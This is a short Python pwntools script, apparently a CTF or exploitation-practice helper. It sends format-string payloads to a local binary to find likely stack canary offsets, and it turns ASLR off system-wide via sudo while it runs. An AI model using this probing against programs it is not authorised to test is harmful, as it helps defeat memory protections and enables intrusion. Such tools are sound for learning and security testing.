from pwn import *
from sys import argv
from argparse import ArgumentParser
from os import system
from variables import colours

### Parse arguments
parser = ArgumentParser(description="Brute some canaries")

parser.add_argument("-f", dest="file", type=str, help="The file to test")
parser.add_argument("-d", dest="depth", type=int, help="How many format strings should be attempt")

args = parser.parse_args()


### Disable ASLR to ignore libc, set to WARN to prevent flooding of terminal
system("echo 0 | sudo tee /proc/sys/kernel/randomize_va_space")
context.log_level = 'WARN'

### Initialise empty dictionary
offsets = {}

for _ in range(2):
	for x in range(1, int(args.depth) + 1):
		p = ELF("./" + args.file).process()
		p.clean(0.2)
		p.sendline("%" + str(x) + "$lp")

		value = re.findall(r"0x[0-9A-Fa-f]*", p.recvline())[0]

		if value.endswith("00"):
			if x not in offsets:
				offsets[x] = set()
			offsets[x].add(value)


print("#### Possible Due To Changing Value ####")
for x in offsets:
    if len(offsets[x]) == 2:
        print(colours.GREEN + "[" + colours.RED + "*" + colours.GREEN + "] " + colours.RESET + str(x) + "\t" + ", ".join(offsets[x]))


system("echo 2 | sudo tee /proc/sys/kernel/randomize_va_space")